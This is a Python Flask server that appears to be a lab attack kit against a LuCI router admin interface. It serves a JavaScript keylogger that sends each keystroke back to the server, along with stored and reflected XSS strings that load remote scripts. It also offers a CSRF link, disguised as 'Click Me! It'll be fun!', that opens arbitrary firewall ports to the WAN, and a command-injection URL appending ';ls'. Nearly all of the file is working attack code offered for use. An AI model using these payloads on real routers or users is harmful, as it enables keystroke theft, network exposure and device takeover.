#!/usr/bin/python
from flask import Flask
import os

app = Flask(__name__)
app.debug=True

@app.route('/')
def hello_world():
    return '<br><a href=/csrf/open/80>CSRF:Open Port 80 to the WAN</a></>\
            <br><a href=/reflected_xss>Reflected XSS attack (doesn\'t work in chrome)</a></>\
            <br><a href=/command_injection_ls>ls via command injection</a></>\
            <br></>\
            <br>The XSS attack string to call a remote payload should look like this: <xmp><script src=//172&#46;30&#46;254&#46;2/s></script>.</xmp> That points to /s which is the simple alert(1) script. For the keylogger, you should point to <a href=/t>/t</a>, so it would look like this: <xmp><script src=//172&#46;30&#46;254&#46;2/s></script></xmp></>\
            '


#
#XSS Stuff
#

#this is how our keylogger will get data back to the server, it'll write to ~\log.txt
@app.route('/fwrite/<data>')
def fwrite(data):
    with open("log.txt", "a") as myfile:
        myfile.write(data+"\n")
    return ''

#this is the code for the actual key logger--it logs keys and sends them back to the server. This code could use some work.
@app.route('/t')
def keylogger():
    return '\
            function httpGet(theUrl){\
                var xmlHttp = new XMLHttpRequest();\
                xmlHttp.open( \"GET\", theUrl, false );\
                xmlHttp.send( null );\
                return xmlHttp.responseText;\
            }\
            \
            var keys=\'\';\
            document.onkeypress = function(e) {\
                get = window.event?event:e;\
                key = get.keyCode?get.keyCode:get.charCode;\
                key = String.fromCharCode(key);\
                keys+=key;\
                httpGet(\'http://127.0.0.1/fwrite/\'+keys);\
            }\
            '
#this is a simple javascript alert payload....boring right?
@app.route('/s')
def do():
    return 'alert(1)'

#this is the final attack string for the stored cross-site scripting attack...it's just here for your convenience
@app.route('/stored_xss_attack')
def sxa():
    return '<xmp><script src=//172&#46;30&#46;254&#46;2/s></script></xmp>'

#
#CSRF Stuff
#

#open whicherver port is specified in the url
@app.route('/csrf/open/<port>')
def csrf_open(port):
    return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=a/admin/network/firewall/rules/?cbi.cbe.firewall.cfg0892bd.enabled=1&_newopen.extport='+port+'&_newfwd.dest=wan&cbi.cbe.firewall.cfg0a92bd.enabled=1&cbi.submit=1&cbi.sts.firewall.redirect=&cbid.firewall.cfg0292bd.enabled=1&cbi.cbe.firewall.cfg0492bd.enabled=1&cbid.firewall.cfg0a92bd.enabled=1&_newsnat.dport=&_newsnat.dip=1&cbid.firewall.cfg0692bd.enabled=1&_newsnat.dest=wan&cbid.firewall.cfg0892bd.enabled=1&_newsnat.src=lan&_newfwd.src=lan&cbi.cbe.firewall.cfg0692bd.enabled=1&cbi.cbe.firewall.cfg0292bd.enabled=1&_newsnat.name=&_newopen.submit=Add&_newfwd.name=&_newopen.proto=tcp&_newopen.name=tfive&cbid.firewall.cfg0492bd.enabled=1&cbi.sts.firewall.rule=&cbi.apply=Save & Apply>Click Me! It\'ll be fun!</a><br></><br>Also, Don\'t forget that you can open any tcp port by going to: <xmp>/csrf/open/<port number></xmp></>'

#@app.route('/csrf100')
#def csrf2():
#    return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=a/admin/network/firewall/rules/?cbi.cbe.firewall.cfg0892bd.enabled=1&_newopen.extport=100&_newfwd.dest=wan&cbi.cbe.firewall.cfg0a92bd.enabled=1&cbi.submit=1&cbi.sts.firewall.redirect=&cbid.firewall.cfg0292bd.enabled=1&cbi.cbe.firewall.cfg0492bd.enabled=1&cbid.firewall.cfg0a92bd.enabled=1&_newsnat.dport=&_newsnat.dip=1&cbid.firewall.cfg0692bd.enabled=1&_newsnat.dest=wan&cbid.firewall.cfg0892bd.enabled=1&_newsnat.src=lan&_newfwd.src=lan&cbi.cbe.firewall.cfg0692bd.enabled=1&cbi.cbe.firewall.cfg0292bd.enabled=1&_newsnat.name=&_newopen.submit=Add&_newfwd.name=&_newopen.proto=tcp&_newopen.name=malicious&cbid.firewall.cfg0492bd.enabled=1&cbi.sts.firewall.rule=&cbi.apply=Save & Apply>csrf</>'

#
#Command Injection Stuff
#

@app.route('/command_injection_ls')
def cmd_inject():
    return '<a href=http://172.30.254.1/cgi-bin/luci/admin/network/diag_ping/;ls'

#
#Reflected Cross-Site Scripting Stuff
#

@app.route('/reflected_xss')
def xss():
    return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=whatever/admin/system/packages?query=<script>alert(1)</script>'


if __name__ == '__main__':
    #app.run(port=5000)
    app.run(port=80, host='0.0.0.0') #to allow remote hosts

